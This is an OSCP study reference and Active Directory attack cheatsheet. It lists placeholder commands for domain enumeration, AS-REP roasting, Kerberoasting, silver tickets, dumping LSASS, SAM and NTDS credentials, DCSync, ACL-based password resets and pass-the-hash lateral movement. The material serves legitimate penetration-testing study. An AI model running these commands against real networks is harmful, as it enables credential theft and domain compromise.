title: 0.0 OSCP Exploitation Reference
text: id="oscp-exploitation-reference">0.0 OSCP Exploitation Reference Complete operational task index — every procedure and task, searchable by service or technique. A task-oriented study knowledge base and exam playbook. Start with the Attack Strategy Map to compare methods by prerequisites and open a self-contained study entry. Use the stage procedures and cheatsheets for operational lookup. Practical mastery remains tracked separately from publication. <h2

title: 0.0.1 Learning resources
text: id="learning-resources">0.0.1 Learning resources AD Notes — focused investigations : a short quick reference, where to look, annotated output, expected behavior and evidence-driven next checks. Interactive strategy workspace : expandable workflows, recognition checks, commands and evidence-driven next decisions; attack-path visualizer for explicitly recorded investigation steps. Attack Strategy Map : the complete documented method inventory, prerequisite-based selection and links between capability transitions. Discovery-to-recognition workflows : where to investigate before choosing an attack. Recognition practice : unanswered paper cases for testing clue discovery and prerequisite reasoning. Self-contained method guides : explanations, prerequisite checks, commands/variants, worked examples, verification and failure-driven alternatives. Master Notes : attack reasoning, necessary mechanics, recognition clues and failure interpretation. Speedrun breakdown : attack tasks, practical outcomes and the tooling map for accelerated study. getSH coverage map : source snapshot, route/topic accounting, corrections and remaining speedrun gaps. Cheatsheet index : compact, executable commands and decision cues for immediate lookup. Use the stage and quick-task indexes below for complete operational procedures. Operational flow: discovery and scanning → service enumeration → initial access → shells/transfers/credentials → local privilege escalation → AD/lateral movement → pivoting/tunneling → evidence/reporting. Study flow: use the grouped study sequence . Numbered blocks remain stable lookup units; related blocks are learned as complete attack paths. <h2

title: 0.0.2 Stage index
text: id="stage-index">0.0.2 Stage index Stage Purpose Open 01 Establish reachability, port coverage, application clues and the next enumeration queue Discovery and scanning 02 Extract names, files, permissions, credentials, configuration and usable access from services Service enumeration 03 Use verified access paths to establish a remote session Initial access 04 Make execution reliable, move files and classify/recover/test credential material Shells, transfers and credentials 05 Trace Linux/Windows object control into higher-privileged execution Local privilege escalation 06 Map domain relationships, gain a better identity and move through compatible services AD and lateral movement 07 Reach internal services through explicit forwards, SOCKS or routed pivots Pivoting and tunneling 08 Preserve reproducible transitions and report-ready evidence Evidence and reporting Tools and scripts — lookup by tool name with task-specific commands and selection cues. <h2

title: 0.0.3.1 Placeholder key
text: id="variant-0-0-3-1">0.0.3.1 Placeholder key Placeholder Replace with TARGET Destination IP LHOST Kali/listener IP reachable from the target PORT One listening or connection port PORTS Port, comma-separated list or range; one number where stated FILE Filename to transfer KEY SSH private-key path SUBNET Explicitly assigned CIDR range DC_IP Domain controller IP DOMAIN Domain name USER / PASSWORD / AUTH_PASSWORD / PRIV_PASSWORD / HASH Authentication material <h2

title: 0.0.4 How to use the reference
text: id="how-to-use-the-reference">0.0.4 How to use the reference For study, choose the objective in the strategy map and compare its method prerequisites. Read the selected method's checks, explanation, example, variants and next transitions. For scoped practice, open its linked operational procedure and establish the required access/configuration. Replace every placeholder and use the baseline or variant matching the observed context. Interpret decisive output and failure cues before claiming the intended effect. After a state change, follow the linked next methods and re-enumerate the new capability. Target IPs, credentials, flags, transcripts, licensed course text and machine solutions stay in private lab records.

title: 10.1 Active Directory Cheatsheet
text: id="active-directory-cheatsheet">10.1 Active Directory Cheatsheet ← Cheatsheet index | Full AD procedures | Strategy map | Study methods: Map Active Directory attack paths ; Gain a more useful domain identity ; Move to another host <h2

title: 10.1.1 State line
text: id="state-line">10.1.1 State line Where to look and how to read the output | Investigation command chooser IDENTITY -> GROUP -> RIGHT -> HOST/SERVICE -> SESSION/CREDENTIAL -> NEW IDENTITY Keep separate identity, host, route and lead maps. Authentication , authorization , reachability and session presence are different claims. Full procedure: domain mapping . <h2

title: 10.1.2 Domain/DC truth
text: id="domaindc-truth">10.1.2 Domain/DC truth whoami /all echo %USERDNSDOMAIN% echo %LOGONSERVER% nltest /dsgetdc:DOMAIN nltest /dclist:DOMAIN nltest /domain_trusts /all_trusts w32tm /query /status net accounts /domain [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() Resolve-DnsName -Type SRV _ldap._tcp.dc._msdcs.DOMAIN Resolve-DnsName -Type SRV _kerberos._tcp.DOMAIN dig +short SRV _ldap._tcp.dc._msdcs.DOMAIN @DC_IP ldapsearch -x -LLL -H ldap://DC_HOST:389 -s base -b '' \ defaultNamingContext configurationNamingContext rootDomainNamingContext dnsHostName nxc smb DC_IP -d DOMAIN -u USER -p 'PASSWORD' Record source host, network identity, domain FQDN, DC FQDN/IP, DNS and time. If IP-based LDAP/SMB works but Kerberos fails, fix name/ SPN /time/ KDC routing first. <h2

title: 10.1.3 Native / RSAT / ADSI
text: id="native--rsat--adsi">10.1.3 Native / RSAT / ADSI net user /domain net user USER /domain net group /domain net group "Domain Admins" /domain net group "GROUP" /domain net view /domain Get-ADDomain Get-ADForest Get-ADDomainController -Filter * Get-ADUser -Filter * -Properties Enabled,MemberOf,ServicePrincipalName,Description Get-ADGroupMember -Identity 'GROUP' -Recursive Get-ADComputer -Filter * -Properties DNSHostName,OperatingSystem,ServicePrincipalName RSAT cmdlets are optional. If absent, query with built-in ADSI: $root = [ADSI]'LDAP://RootDSE' $base = [ADSI]("LDAP://" + $root.defaultNamingContext) $s = New-Object System.DirectoryServices.DirectorySearcher($base) $s.PageSize = 1000 $s.Filter = '(&(objectCategory=person)(objectClass=user))' $s.PropertiesToLoad.AddRange(@('samaccountname','userprincipalname','objectsid','memberof','serviceprincipalname','description')) $s.FindAll() | ForEach-Object { $_.Properties } <h2

title: 10.1.4 Authenticated LDAP
text: id="authenticated-ldap">10.1.4 Authenticated LDAP ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W \ -E pr=1000/noprompt -b 'DC=DOMAIN,DC=TLD' \ '(&(objectCategory=person)(objectClass=user))' \ sAMAccountName userPrincipalName objectSid userAccountControl memberOf description servicePrincipalName ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W \ -E pr=1000/noprompt -b 'DC=DOMAIN,DC=TLD' \ '(objectCategory=group)' sAMAccountName objectSid member groupType description ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W \ -E pr=1000/noprompt -b 'DC=DOMAIN,DC=TLD' \ '(objectCategory=computer)' dNSHostName operatingSystem operatingSystemVersion servicePrincipalName LDAP result Next decision Error 49 Recheck UPN/domain context, secret and account state Stronger authentication/confidentiality required Use permitted LDAPS/StartTLS or Kerberos/SASL path Size limit / round result count Add paging; narrow base/filter Referral/partial results Query the correct domain/partition or GC deliberately Successful bind, empty search Verify RootDSE base, filter, known object and attribute visibility <h2

title: 10.1.5 PowerView
text: id="powerview">10.1.5 PowerView Import-Module .\PowerView.ps1 Get-Command -Module PowerView Get-Domain Get-DomainController Get-DomainTrust Get-DomainUser Get-DomainGroup Get-DomainComputer Get-DomainGroupMember -Identity 'GROUP' -Recurse Get-DomainUser -SPN Find-LocalAdminAccess PowerSploit is archived and forks differ. Course aliases such as Get-NetUser may exist; inspect the loaded copy with Get-Command and Get-Help . <h2

title: 10.1.6 Shares / SYSVOL / NETLOGON
text: id="shares--sysvol--netlogon">10.1.6 Shares / SYSVOL / NETLOGON nxc smb DC_IP -d DOMAIN -u USER -p 'PASSWORD' --shares smbclient -L //DC_IP -U 'DOMAIN/USER' smbclient //DC_IP/SYSVOL -U 'DOMAIN/USER' -c 'recurse ON; ls' smbclient //DC_IP/SHARE -U 'DOMAIN/USER' List → connect → exact file read → exact file write are separate permissions. Inspect policy/logon/deployment material selectively for scripts, configuration, backups, connection strings and legacy GPP cpassword ; return any secret to the credential workflow. <h2

title: 10.1.7 SPNs, ACLs, host rights and sessions
text: id="spns-acls-host-rights-and-sessions">10.1.7 SPNs, ACLs, host rights and sessions Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname,memberof,pwdlastset Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|ExtendedRight|WriteProperty|Self' } Find-LocalAdminAccess Get-NetSession -ComputerName COMPUTER -Verbose nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' setspn -L ACCOUNT PsLoggedOn.exe \\COMPUTER SPN ≠ weak password. ACE ≠ effective exploitable control. (Pwn3d!) means administrative SMB context, not every remote protocol. Session output is volatile and can be blocked; session presence ≠ accessible credentials. <h2

title: 10.1.8 BloodHound collection and decision
text: id="bloodhound-collection-and-decision">10.1.8 BloodHound collection and decision <h3

title: 10.1.8.1 Directory-only first pass; avoids workstation contact.
text: id="variant-10-1-8-1">10.1.8.1 Directory-only first pass; avoids workstation contact. # Directory-only first pass; avoids workstation contact. .\SharpHound.exe --CollectionMethods DCOnly --OutputDirectory .\bh --ZipFileName domain-dconly.zip <h3

title: 10.1.8.2 Add only when the selected host question needs it.
text: id="variant-10-1-8-2">10.1.8.2 Add only when the selected host question needs it. # Add only when the selected host question needs it. .\SharpHound.exe --CollectionMethods LocalGroup --ComputerFile .\candidate-hosts.txt --OutputDirectory .\bh --ZipFileName candidate-localgroups.zip .\SharpHound.exe --CollectionMethods Session --ComputerFile .\candidate-hosts.txt --Loop --LoopDuration 00:10:00 --OutputDirectory .\bh --ZipFileName candidate-sessions.zip # Linux collector alternative; confirm release/deployment compatibility. bloodhound-python --help bloodhound-python -u USER -p 'PASSWORD' -d DOMAIN -ns DC_IP -dc DC_HOST -c All --zip SharpHound with no flags uses its broader default; All runs every supported collection method and is not the automatic first pass. After import: mark only principals/hosts actually controlled; inspect group nesting and outbound control from the current identity; inspect host-access edges and high-value paths; classify static-ish ACL/group/GPO edges versus volatile sessions; manually verify the minimum edge and its route/service. CONTROLLED PRINCIPAL -> EFFECTIVE RIGHT -> TARGET -> REACHABLE SERVICE -> EXPECTED TRANSITION -> MINIMUM VALIDATION -> NEXT BLOCK Validate every chosen edge manually; graph presence ≠ effective right, current session or reachable service. <h2

title: 10.1.9 AS-REP roast
text: id="as-rep-roast">10.1.9 AS-REP roast Need: known username(s), KDC reachability and preauthentication disabled on the target account. Output: a $krb5asrep$ verifier, not a password. <h3

title: 10.1.9.1 One known account
text: id="variant-10-1-9-1">10.1.9.1 One known account # One known account impacket-GetNPUsers 'DOMAIN/TARGET_USER' -no-pass -request -dc-ip DC_IP \ -format hashcat -outputfile TARGET_USER.asrep <h3

title: 10.1.9.2 Supplied username list
text: id="variant-10-1-9-2">10.1.9.2 Supplied username list # Supplied username list impacket-GetNPUsers DOMAIN/ -no-pass -request -usersfile users.txt \ -dc-ip DC_IP -format hashcat -outputfile asrep.hashes <h3

title: 10.1.9.3 Authenticated candidate discovery/request
text: id="variant-10-1-9-3">10.1.9.3 Authenticated candidate discovery/request # Authenticated candidate discovery/request impacket-GetNPUsers 'DOMAIN/USER:PASSWORD' -request -dc-ip DC_IP \ -format hashcat -outputfile asrep.hashes hashcat -m 18200 asrep.hashes wordlist.txt Rubeus.exe asreproast /user:TARGET_USER /domain:DOMAIN /dc:DC_HOST /outfile:TARGET_USER.asrep /format:hashcat Empty output can mean no candidate, a bad list/domain/DC, unreachable KDC or tool error. A returned verifier may still be infeasible to crack. <h2

title: 10.1.10 Kerberoast
text: id="kerberoast">10.1.10 Kerberoast Need: any valid domain identity, KDC reachability and a selected SPN-bearing account. Output: a TGS verifier for offline guessing. <h3

title: 10.1.10.1 Enumerate first without requesting every ticket
text: id="variant-10-1-10-1">10.1.10.1 Enumerate first without requesting every ticket # Enumerate first without requesting every ticket impacket-GetUserSPNs -dc-ip DC_IP 'DOMAIN/USER:PASSWORD' <h3

title: 10.1.10.2 Request one prioritized user account
text: id="variant-10-1-10-2">10.1.10.2 Request one prioritized user account # Request one prioritized user account impacket-GetUserSPNs -request-user TARGET_USER -dc-ip DC_IP \ -outputfile TARGET_USER.tgs 'DOMAIN/USER:PASSWORD' Rubeus.exe kerberoast /stats Rubeus.exe kerberoast /user:TARGET_USER /outfile:TARGET_USER.tgs /format:hashcat Prefix / etype Hashcat mode $krb5tgs$23$ 13100 $krb5tgs$17$ 19600 $krb5tgs$18$ 19700 hashcat -m 13100 TARGET_USER.tgs wordlist.txt Select by privilege, password age and downstream access. “No entries found” can be a query/auth/DC problem or genuinely no matching user SPN; it does not prove Kerberos is unavailable. <h3

title: 10.1.10.3 Targeted Kerberoast from SPN write
text: id="targeted-kerberoast-from-spn-write">10.1.10.3 Targeted Kerberoast from SPN write setspn -S TEMP/TARGET_USER TARGET_USER setspn -Q TEMP/TARGET_USER Rubeus.exe kerberoast /user:TARGET_USER /outfile:TARGET_USER.tgs /format:hashcat setspn -D TEMP/TARGET_USER TARGET_USER Requires effective write access to the user's servicePrincipalName attribute. Use a unique SPN and remove it immediately; this changes directory state. <h2

title: 10.1.11 Tickets
text: id="tickets">10.1.11 Tickets klist klist tgt klist sessions klist -li 0xLUID tickets Rubeus.exe triage Rubeus.exe ptt /ticket:ticket.kirbi Seen in ticket Means Next check Client: USER @ REALM Identity represented Groups, rights and account context Client: HOST$ @ REALM Computer identity Machine-account rights; do not treat as an interactive user Server: krbtgt/REALM TGT Validity, realm and which service tickets this identity may request Server: cifs/HOST SMB ticket for HOST SMB reachability and share/object authorization Server: ldap/DC_HOST LDAP ticket for the DC LDAP authorization; this is not proof of DCSync Other SERVICE/HOST Ticket for that exact SPN Matching protocol, hostname, DNS and route End Time passed Expired Obtain a valid ticket through an authorized path; importing is insufficient Kdc Called: DC_HOST Issuing KDC Not evidence of access to the DC forwardable , renewable , initial , pre_authent and encryption type do not prove privilege. klist purge destroys cached tickets; do not use it during triage. Full field guide: Kerberos and identity transitions . impacket-ticketConverter ticket.kirbi ticket.ccache export KRB5CCNAME="$PWD/ticket.ccache" klist <h3

title: 10.1.11.1 Silver ticket
text: id="silver-ticket">10.1.11.1 Silver ticket impacket-ticketer -nthash SERVICE_OR_MACHINE_NT_HASH -domain-sid DOMAIN_SID \ -domain DOMAIN -spn cifs/TARGET_HOST AUTHORIZED_TEST_USER export KRB5CCNAME="$PWD/AUTHORIZED_TEST_USER.ccache" klist Requires the exact service/machine key, realm, domain SID and SPN. It is service-scoped; import success is not authorization. Modern PAC checks, wrong naming, stale keys or an unsupported service can invalidate the result. <h2

title: 10.1.12 Credential access
text: id="credential-access">10.1.12 Credential access Source Need Result Do not confuse it with Existing ticket cache Current/selected logon session TGT/TGS Password or universal access LSASS Local admin/SYSTEM plus usable debug/dump path Active-session secrets/tickets SAM database SAM + SYSTEM Matched local hives Local account hashes Domain account database SECURITY + SYSTEM Matched hives LSA secrets/cached domain verifiers Reusable NT hash in every case Credential Manager + DPAPI Correct user/machine context and keys Protected saved credentials Automatic cleartext NTDS + SYSTEM Already controlled DC/offline files Directory secrets Ordinary host-admin access DRS/DCSync Domain-root replication rights Selected directory secret LDAP bind or local admin whoami /all klist cmdkey /list vaultcmd /list mimikatz.exe privilege::debug sekurlsa::logonpasswords sekurlsa::tickets # Matched hive copies; requires suitable local privilege reg save HKLM\SAM .\SAM.hive /y reg save HKLM\SYSTEM .\SYSTEM.hive /y reg save HKLM\SECURITY .\SECURITY.hive /y <h3

title: 10.1.12.1 impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL
text: id="variant-10-1-12-1">10.1.12.1 impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL impacket-secretsdump -sam SAM.hive -system SYSTEM.hive LOCAL impacket-secretsdump -security SECURITY.hive -system SYSTEM.hive LOCAL <h3

title: 10.1.12.2 Already-controlled DC/offline NTDS pair
text: id="variant-10-1-12-2">10.1.12.2 Already-controlled DC/offline NTDS pair # Already-controlled DC/offline NTDS pair impacket-secretsdump -ntds ntds.dit -system SYSTEM.hive LOCAL LSA protection or Credential Guard can block/isolate LSASS material without disproving the other sources. DCC2 is for offline password guessing (Hashcat mode 2100), not pass-the-hash. <h2

title: 10.1.13 ACL-backed identity transitions
text: id="acl-backed-identity-transitions">10.1.13 ACL-backed identity transitions Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs | Where-Object { $_.ActiveDirectoryRights -match 'GenericAll|GenericWrite|WriteDacl|WriteOwner|ExtendedRight' } ConvertFrom-SID 'S-1-5-21-...' Validated right Minimal transition Important cue Reset password / GenericAll on user Set-DomainUserPassword Disruptive; old unknown password cannot be restored Member-property write / GenericAll on group Add-DomainGroupMember New logon/ token may be required SPN-property write on user temporary SPN → targeted roast Remove SPN immediately WriteDacl grant one narrower right Export and restore original security descriptor WriteOwner take ownership → DACL path Owner change alone is not the final effect $Secure = ConvertTo-SecureString 'TEMP_PASSWORD' -AsPlainText -Force Set-DomainUserPassword -Identity TARGET_USER -AccountPassword $Secure -Verbose Add-DomainGroupMember -Identity TARGET_GROUP -Members CONTROLLED_USER -Verbose Get-DomainGroupMember -Identity TARGET_GROUP | Where-Object { $_.MemberName -eq 'CONTROLLED_USER' } Remove-DomainGroupMember -Identity TARGET_GROUP -Members CONTROLLED_USER -Verbose -Confirm:$false Set-DomainObjectOwner -Identity TARGET_OBJECT -OwnerIdentity CONTROLLED_USER -Verbose Add-DomainObjectAcl -TargetIdentity TARGET_OBJECT -PrincipalIdentity CONTROLLED_USER -Rights ResetPassword -Verbose Remove-DomainObjectAcl -TargetIdentity TARGET_OBJECT -PrincipalIdentity CONTROLLED_USER -Rights ResetPassword -Verbose <h2

title: 10.1.14 DCSync
text: id="dcsync">10.1.14 DCSync Get-DomainObjectAcl -Identity 'DC=DOMAIN,DC=TLD' -ResolveGUIDs | Where-Object { $_.ObjectAceType -match 'Replication-Get-Changes' } impacket-secretsdump -just-dc-user TARGET_USER -dc-ip DC_IP \ 'DOMAIN/USER:PASSWORD@DC_HOST' lsadump::dcsync /domain:DOMAIN /user:TARGET_USER Requires effective Replicating Directory Changes + Changes All at the domain root, with filtered-set rights where applicable. Request one approved account and stop after proof; local admin, LDAP access or an LDAP service ticket is insufficient. <h2

title: 10.1.15 Conditional: AD CS
text: id="conditional-ad-cs">10.1.15 Conditional: AD CS certipy-ad find -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP -enabled -vulnerable -stdout certipy-ad req -u 'USER@DOMAIN' -p 'PASSWORD' -dc-ip DC_IP -target DC_HOST -ca CA_NAME -template TEMPLATE certipy-ad auth -pfx CERTIFICATE.pfx -dc-ip DC_IP Evidence-led supplement, not core Block 11. Confirm enabled/published template, enrollment rights, EKUs, subject/SAN controls and approval/signature requirements before a request. <h2

title: 10.1.16 Lateral movement chooser
text: id="lateral-movement-chooser">10.1.16 Lateral movement chooser Select by credential type, accepted authentication protocol, reachable service and the exact remote right. Authentication success is not execution success. Full procedure: lateral movement . Starting evidence First justified path Required condition Main fallback Password + SMB admin PsExec/SMBExec 445, admin share and SCM rights WMIExec or ATExec if their RPC rights work Password/hash + WMI rights WMIExec 135 + dynamic RPC; SMB for normal output -nooutput with bounded side-effect proof Password/hash + WinRM right Evil-WinRM/WinRS 5985/5986 and endpoint authorization PowerShell remoting from Windows Password + remote-interactive right RDP 3389, NLA and effective RDP logon right WinRM or command execution NT hash + Restricted Admin FreeRDP /pth RDP Restricted Admin permitted; user is admin SMB/WMI PtH TGT/ccache Kerberos-capable Impacket/WinRM path FQDN/SPN, DNS, time and KDC route Request the service ticket first Service ticket Only its exact service/host Compatible SPN and client Obtain a TGT or matching TGS <h3

title: 10.1.16.1 Preflight and credential classification
text: id="preflight-and-credential-classification">10.1.16.1 Preflight and credential classification nmap -Pn -sT -sV -p 135,139,445,3389,5985,5986 TARGET nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' nxc smb TARGET -d DOMAIN -u USER -H NT_HASH nxc smb TARGET -u Administrator -H NT_HASH --local-auth (Pwn3d!) is an SMB administrative-context cue, not proof of WinRM, WMI, RDP or every SMB execution method. Port 135 alone does not prove that negotiated dynamic RPC ports are reachable. <h3

title: 10.1.16.2 SMB, services and scheduled tasks
text: id="smb-services-and-scheduled-tasks">10.1.16.2 SMB, services and scheduled tasks impacket-psexec 'DOMAIN/USER:PASSWORD@TARGET' impacket-psexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' impacket-smbexec 'DOMAIN/USER:PASSWORD@TARGET' impacket-smbexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' impacket-atexec 'DOMAIN/USER:PASSWORD@TARGET_HOST' "cmd.exe /c hostname & whoami" impacket-atexec -hashes :NT_HASH 'DOMAIN/USER@TARGET_HOST' "cmd.exe /c hostname & whoami" PsExec uploads/starts a RemCom service; SMBExec repeatedly creates services with redirected output; ATExec creates a scheduled task and normally reads output from ADMIN$\Temp . All require more than valid credentials. <h3

title: 10.1.16.3 WMI/DCOM
text: id="wmidcom">10.1.16.3 WMI/DCOM impacket-wmiexec 'DOMAIN/USER:PASSWORD@TARGET' impacket-wmiexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' impacket-wmiexec -nooutput 'DOMAIN/USER:PASSWORD@TARGET' "cmd.exe /c echo MOVEMENT_OK > C:\Windows\Temp\movement-proof.txt" impacket-dcomexec 'DOMAIN/USER:PASSWORD@TARGET' impacket-dcomexec -hashes :NT_HASH 'DOMAIN/USER@TARGET' WMIExec normally needs SMB for output even though process creation uses WMI/DCOM. Current Impacket DCOMExec rejects Kerberos for its supported DCOM objects; use WMIExec with Kerberos instead. <h3

title: 10.1.16.4 Kerberos cache
text: id="kerberos-cache">10.1.16.4 Kerberos cache export KRB5CCNAME="$PWD/USER.ccache" klist impacket-wmiexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST' impacket-psexec -k -no-pass -dc-ip DC_IP -target-ip TARGET_IP 'DOMAIN/USER@TARGET_HOST' impacket-atexec -k -no-pass -dc-ip DC_IP 'DOMAIN/USER@TARGET_HOST' "cmd.exe /c hostname & whoami" Keep the SPN-matching hostname in the target string; use -target-ip only for routing. A CIFS TGS does not authorize HTTP/WinRM or arbitrary HOST services. <h3

title: 10.1.16.5 WinRM and RDP
text: id="winrm-and-rdp">10.1.16.5 WinRM and RDP evil-winrm -i TARGET_HOST -u USER -p 'PASSWORD' evil-winrm -i TARGET -u USER -H NT_HASH evil-winrm -i TARGET_FQDN -r DOMAIN -K USER.ccache --spn HTTP xfreerdp3 /v:TARGET_HOST /d:DOMAIN /u:USER /p:'PASSWORD' /cert:ignore /dynamic-resolution +clipboard xfreerdp3 /v:TARGET_HOST /d:DOMAIN /u:USER /pth:NT_HASH /cert:ignore /dynamic-resolution winrs /r:TARGET_HOST /u:DOMAIN\USER /p:PASSWORD "cmd /c hostname & whoami" mstsc.exe /v:TARGET_HOST mstsc.exe /restrictedAdmin /v:TARGET_HOST FreeRDP 3 commonly exposes xfreerdp3 ; older packages use xfreerdp . /pth is Restricted Admin mode and requires administrator access, not merely ordinary RDP logon permission. <h3

title: 10.1.16.6 Key and ticket transitions
text: id="key-and-ticket-transitions">10.1.16.6 Key and ticket transitions sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:NT_HASH /run:powershell.exe Rubeus.exe asktgt /user:USER /domain:DOMAIN /rc4:NT_HASH /dc:DC_HOST /ptt Rubeus.exe asktgt /user:USER /domain:DOMAIN /aes256:AES256_KEY /dc:DC_HOST /ptt Rubeus.exe ptt /ticket:ticket.kirbi klist Overpass-the-Hash uses a long-term key to obtain a TGT; Pass-the-Ticket imports an existing ticket. In a Mimikatz PtH process, local whoami can remain the original process token while outbound authentication uses the supplied identity. Failure Check Timeout/refused Actual source route, listener, firewall and dynamic RPC Kerberos error DNS, hostname/SPN, time, KDC route, ticket validity Auth works, execution fails ADMIN$/SCM/WMI/task/endpoint rights, token filtering and method prerequisites Process created, no output SMB/output channel, session 0, or verify a bounded side effect WinRM works, second hop fails Credential delegation/double-hop context RDP password works, /pth fails Restricted Admin configuration and administrator status BloodHound edge unusable Effective principal, inheritance, host reachability, required service Share list works, file denied Object-level ACL and guest/null mapping After access, verify hostname , whoami /all , interfaces/routes and klist ; then re-enumerate rights, sessions, credentials and newly reachable hosts. <h2

title: 10.1.17 Re-enumerate
text: id="re-enumerate">10.1.17 Re-enumerate New identity/host/route → repeat domain rights, shares, SPNs, sessions, host admin, local secrets and internal reachability. <h2

title: 10.1.18 Discover and recognize candidates
text: id="discover-and-recognize-candidates">10.1.18 Discover and recognize candidates Use these discovery checks to find a candidate, then validate the missing conditions. Cues are illustrative; complete synthetic outputs and three-outcome examples are in the linked study entries. <h3

title: 10.1.18.1 Map Active Directory attack paths
text: id="map-active-directory-attack-paths">10.1.18.1 Map Active Directory attack paths <summary

title: 10.1.18.1.1 Find: Establish domain identity, DC, DNS, time and route
text: id="variant-10-1-18-1-1">10.1.18.1.1 Find: Establish domain identity, DC, DNS, time and route Start with the session identity and known credential scope; discover the realm/DC and inspect DNS, time and routes. whoami /all whoami /upn nltest /dsgetdc:DOMAIN w32tm /query /status Recognize: The named realm/DC and actual identity establish where directory/authentication checks must run. Validate next: Check DC/service reachability, resolver/SPN naming and clock compatibility, not merely the password. Establish domain identity, DC, DNS, time and route . <summary

title: 10.1.18.1.2 Find: Enumerate directory objects with native, LDAP and PowerView approaches
text: id="variant-10-1-18-1-2">10.1.18.1.2 Find: Enumerate directory objects with native, LDAP and PowerView approaches Use the available built-in/LDAP interface from the verified domain context; inspect one useful user/group before broad graph assumptions. net user USER /domain net group "GROUP" /domain Recognize: Account/group membership supplies a relationship to investigate; nested membership and effective destination rights remain separate. Validate next: Verify object SID/type, nesting and the exact right granted to that principal. Enumerate directory objects with native, LDAP and PowerView approaches . <summary

title: 10.1.18.1.3 Find: Read domain shares, SYSVOL and NETLOGON for useful artifacts
text: id="variant-10-1-18-1-3">10.1.18.1.3 Find: Read domain shares, SYSVOL and NETLOGON for useful artifacts Enumerate the DC/known file-server shares and inspect relevant SYSVOL/NETLOGON paths under the accepted domain identity. net view \\DC_HOST dir \\DOMAIN\SYSVOL dir \\DOMAIN\NETLOGON Recognize: A real domain-readable script gives concrete identity/path leads for credential and host investigation. Validate next: Verify readable artifact content, whether any secret is current and what account/service it belongs to. Read domain shares, SYSVOL and NETLOGON for useful artifacts . <summary

title: 10.1.18.1.4 Find: Identify service accounts and SPNs worth investigating
text: id="variant-10-1-18-1-4">10.1.18.1.4 Find: Identify service accounts and SPNs worth investigating Enumerate servicePrincipalName on user objects and associate each SPN with its owning account and memberships. Get-DomainUser -SPN | Select-Object samaccountname,serviceprincipalname,memberof Recognize: A user-owned service name identifies a potential ticket/password-recovery target whose rights may be useful. Validate next: Check actual account type, KDC authentication, encryption type and feasibility; SPN existence alone is not weakness. Identify service accounts and SPNs worth investigating . <summary

title: 10.1.18.1.5 Find: Validate effective directory-object control
text: id="variant-10-1-18-1-5">10.1.18.1.5 Find: Validate effective directory-object control Select a useful user/group/computer/domain object from mapping and resolve its ACE trustees, rights and object-specific scopes. Get-DomainObjectAcl -Identity TARGET_OBJECT -ResolveGUIDs Recognize: A DACL-control ACE for a possibly controlled trustee opens an intermediate-right candidate. Validate next: Resolve the ACE's trustee and group nesting, target object class, GUID and inheritance/deny scope. For password reset, group writes or DACL changes open that exact operation's procedure and check its additional conditions before modifying anything. Validate effective directory-object control . <summary

title: 10.1.18.1.6 Find: Validate host access and volatile session candidates
text: id="variant-10-1-18-1-6">10.1.18.1.6 Find: Validate host access and volatile session candidates Correlate directory group/session relationships with a specific host's service and local access policy, rather than treating all host edges as administrator access. nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares Recognize: A permitted SMB action identifies a host capability; it does not establish RDP/WinRM/SCM rights. Investigate sessions only with a supported, permitted remote query. Validate next: Verify actual group effectiveness, service/logon rights, session freshness and collection visibility. Validate host access and volatile session candidates . <summary

title: 10.1.18.1.7 Find: Collect focused BloodHound data and validate an attack path
text: id="variant-10-1-18-1-7">10.1.18.1.7 Find: Collect focused BloodHound data and validate an attack path Inspect focused collected relationships and the collector's scope/freshness before following a displayed path. In BloodHound: locate the controlled principal; inspect the exact edge, source object, destination and collection age. Resolve its underlying group/ACL/service evidence with the corresponding manual method. Recognize: The directory edge supplies a candidate intermediate right; missing host/session evidence cannot be invented from the graph. Validate next: Collect with a version-compatible SharpHound/BloodHound collector, then validate the selected edge. Resolve group nesting and effective ACEs for object control; test destination rights and session freshness for host/session edges. Collect focused BloodHound data and validate an attack path . <h3

title: 10.1.18.2 Gain a more useful domain identity
text: id="gain-a-more-useful-domain-identity">10.1.18.2 Gain a more useful domain identity <summary

title: 10.1.18.2.1 Find: Obtain accessible live logon-session credential material
text: id="variant-10-1-18-2-1">10.1.18.2.1 Find: Obtain accessible live logon-session credential material On the verified controlled host inspect current token, logged-on session evidence and protection configuration before choosing a credential source. whoami /all query user reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL Recognize: A useful session is a possible source, while PPL/protection can prevent the chosen process-memory access. Validate next: Verify actual privilege, fresh useful sessions, process/architecture compatibility and protection; prefer accessible tickets when sufficient. Obtain accessible live logon-session credential material . <summary

title: 10.1.18.2.2 Find: Extract local account hashes from matched SAM and SYSTEM
text: id="variant-10-1-18-2-2">10.1.18.2.2 Find: Extract local account hashes from matched SAM and SYSTEM At a host context with justified protected-file access inspect current privileges and the source machine before selecting matched registry material. hostname whoami /priv Recognize: Sufficient source access suggests local-account extraction, not domain-account extraction. Validate next: Verify a supported backup/read operation, complete same-host hives and offline parser context. Extract local account hashes from matched SAM and SYSTEM . <summary

title: 10.1.18.2.3 Find: Extract LSA secrets and cached-domain verifiers
text: id="variant-10-1-18-2-3">10.1.18.2.3 Find: Extract LSA secrets and cached-domain verifiers Inspect the rights and origin of a protected registry backup and distinguish SECURITY data from SAM before collection/parsing. hostname whoami /priv Recognize: A SECURITY source targets secrets/cached verifiers with distinct semantics; it is not simply another SAM. Validate next: Confirm matched key material and classify every returned service/machine secret or DCC2 record. Extract LSA secrets and cached-domain verifiers . <summary

